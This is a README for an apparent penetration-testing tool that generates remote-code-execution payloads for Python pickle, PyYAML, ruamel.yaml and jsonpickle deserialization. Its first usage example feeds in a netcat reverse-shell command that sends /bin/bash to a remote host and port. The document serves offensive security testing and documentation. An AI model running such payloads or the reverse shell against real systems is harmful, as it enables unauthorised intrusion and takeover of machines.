# Pickle Payload Generator

This tool generates remote code execution (RCE) payloads for various Python deserialization modules: `pickle`, `PyYAML`, `ruamel.yaml`, and `jsonpickle`. It supports both `os.system` and `subprocess.Popen` for executing commands, and allows payloads to be base64 encoded.

## Features
- **Multiple Serialization Methods**:
  - Supports `pickle`, `PyYAML`, `ruamel.yaml`, and `jsonpickle`.
- **Command Execution Methods**:
  - Allows choice between `os.system` and `subprocess.Popen`.
- **Cross-Platform Support**:
  - Works with both Linux and Windows environments.
- **Base64 Encoding**:
  - Option to base64 encode the generated payloads.
- **Flexible Input**:
  - Supports command-line arguments for easy automation.

## Requirements

- Python 3.x
- colorama
- pyyaml
- ruamel.yaml
- jsonpickle

## Usage

### Generate and Print Payload

To generate and print the payload, use the following command:

```sh
python3 pickle_payload.py -p "nc -nv 10.0.0.1 1337 -e /bin/bash" --method os
```

### Save Payload to File

To save the payload to a file, use the `-o` or `--output` option:

```sh
python3 pickle_payload.py -p "your command" -o "payload.txt"
```

### Options

- `-p`, `--pickle`: Generate a Pickle payload.
- `-y`, `--yaml`: Generate a YAML payload.
- `-r`, `--ruamel`: Generate a ruamel.yaml payload.
- `-j`, `--jsonpickle`: Generate a JSONPickle payload.
- `-o`, `--output <file>`: File to save the encoded payload.
- `-b`, `--base64`: Base64 encode the payload.
- `--os <os>`: Target operating system (`linux` or `windows`). Default is `linux`.
- `--method <method>`: Method to use for command execution (`subprocess` or `os`). Default is `os`.

### Example

```sh
python3 pickel_payload.py -p "touch test.txt" -o "payload.txt"
```

